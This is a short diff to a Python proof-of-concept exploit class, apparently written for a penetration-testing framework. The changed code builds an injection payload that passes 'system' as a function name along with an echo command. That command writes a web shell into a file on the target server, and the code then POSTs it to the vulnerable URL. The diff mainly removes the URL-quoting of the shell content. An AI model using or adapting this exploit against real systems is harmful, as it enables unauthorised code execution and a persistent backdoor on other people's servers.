@@ -79,8 +79,9 @@ class DemoPOC(POCBase):
         p = self._check(self.url)
         if p:
             data = p[1]
-            data["vars[1][]"] = "echo%20%27{content}%27%20>%20{filename}".format(filename=filename,
-                                                                                 content=quote(webshell))
+            # data["vars[1][]"] = "echo '{content}' > {filename}".format(filename=filename,
+            #                                                                      content=quote(webshell))
+            data["vars[1][]"] = "echo '{content}' > {filename}".format(filename=filename, content=webshell)
             data["vars[0]"] = "system"
             vulurl = self.url + p[0]
             requests.post(vulurl, data=data)
